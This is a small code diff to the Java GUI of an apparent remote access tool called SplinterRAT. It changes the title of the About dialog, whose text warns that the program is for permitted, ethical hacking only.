@@ -86,7 +86,7 @@ public class SplinterGUI {
                         "• This program can only be installed on machines with legal permission. <br>" +
                         "• This program can only be used for ethical hacking purposes.<br>" +
                         "</html>";
-                JOptionPane.showMessageDialog(mainGUI, aboutMessage, "Dive",
+                JOptionPane.showMessageDialog(mainGUI, aboutMessage, "About SplinterRAT",
                         JOptionPane.INFORMATION_MESSAGE,
                         new ImageIcon(imageIcon.getImage()));
 
